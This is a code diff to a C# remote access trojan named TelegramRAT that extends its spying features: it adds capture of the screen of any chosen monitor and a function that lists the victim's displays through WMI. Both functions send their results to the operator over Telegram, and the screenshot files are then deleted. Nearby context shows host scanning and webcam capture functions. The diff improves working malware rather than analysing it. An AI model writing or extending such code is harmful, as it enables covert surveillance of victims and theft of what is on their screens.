@@ -375,19 +375,87 @@ namespace TelegramRAT
             telegram.sendText("✅ Scanning " + to + " hosts completed!");
         }
 
-        // Desktop screenshot
-        public static void desktopScreenshot()
+        // Method to capture screenshot from a specific monitor index
+public static void desktopScreenshot(int monitorIndex = 0)
+{
+    var screens = Screen.AllScreens;
+
+    // Validate the monitor index
+    if (monitorIndex < 0 || monitorIndex >= screens.Length)
+    {
+        telegram.sendText($"Invalid monitor index: {monitorIndex}");
+        return;
+    }
+
+    var screen = screens[monitorIndex];
+    string filename = $"screenshot_{monitorIndex}.png";
+
+    try
+    {
+        // Create bitmap for the selected screen
+        var bmpScreenshot = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb);
+        using (var gfxScreenshot = Graphics.FromImage(bmpScreenshot))
         {
-            string filename = "screenshot.png";
-            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
-            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
-            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
-            bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
-            // Send
-            telegram.sendImage(filename);
-            // Delete photo
+            gfxScreenshot.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);
+        }
+
+        // Save the screenshot
+        bmpScreenshot.Save(filename, ImageFormat.Png);
+        // Send the screenshot
+        telegram.sendImage(filename);
+    }
+    catch (Exception ex)
+    {
+        telegram.sendText($"Error taking screenshot: {ex.Message}");
+    }
+    finally
+    {
+        // Ensure the screenshot file is deleted
+        if (File.Exists(filename))
+        {
             File.Delete(filename);
         }
+    }
+}
+public static void ListMonitors()
+{
+    var screens = Screen.AllScreens;
+    var query = new ManagementObjectSearcher("SELECT * FROM Win32_DesktopMonitor");
+
+    var monitorDetails = new StringBuilder();
+
+    for (int i = 0; i < screens.Length; i++)
+    {
+        var screen = screens[i];
+        string deviceName = screen.DeviceName;
+        int width = screen.Bounds.Width;
+        int height = screen.Bounds.Height;
+        string primaryStatus = screen.Primary ? "Primary" : "Secondary";
+        string model = "Unknown";
+
+        try
+        {
+            foreach (ManagementObject obj in query.Get())
+            {
+                model = obj["Name"]?.ToString() ?? "Unknown Model";
+            }
+        }
+        catch (ManagementException ex)
+        {
+            telegram.sendText($"WMI Exception: {ex.Message}");
+            return; // Exit method on critical error
+        }
+        catch (Exception ex)
+        {
+            telegram.sendText($"General Exception: {ex.Message}");
+            return; // Exit method on critical error
+        }
+
+        monitorDetails.AppendLine($"🖥️ Index: {i}, Resolution: {width} x {height}, Model: {model}, Status: {primaryStatus}");
+    }
+
+    telegram.sendText(monitorDetails.ToString());
+}
 
         // Webcam screenshot
         public static void webcamScreenshot(string delay, string camera)
